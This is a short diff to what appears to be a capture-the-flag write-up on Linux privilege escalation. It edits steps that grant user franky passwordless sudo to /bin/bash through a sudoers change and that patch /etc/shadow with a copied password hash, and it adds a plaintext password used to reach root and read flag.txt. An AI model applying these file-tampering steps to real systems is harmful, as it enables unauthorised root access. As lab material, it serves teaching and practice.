@@ -445,6 +445,10 @@ franky	...				:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 :wq
 ```
 
+```
+[franky@ubuntu]$ sudo -s 
+```
+
 
 Method 2 - Patch /etc/shadow
 
@@ -463,10 +467,10 @@ tester:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtK
 franky:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17949:0:99999:7:::
 ```
 
-I'm root !!!
-
 ```
-[franky@ubuntu]$ sudo -s 
+[franky@ubuntu]$ su tester
+[tester@ubuntu]$ sudo -s
+Password: 3d2yhijinbe
 [root@ubuntu]# cd /root
 [root@ubuntu]# ls
 > rwx------		root	root	flag.txt
@@ -477,3 +481,4 @@ I'm root !!!
 ```
 Key=alabasta # Change it to whatever you like
 ```
+
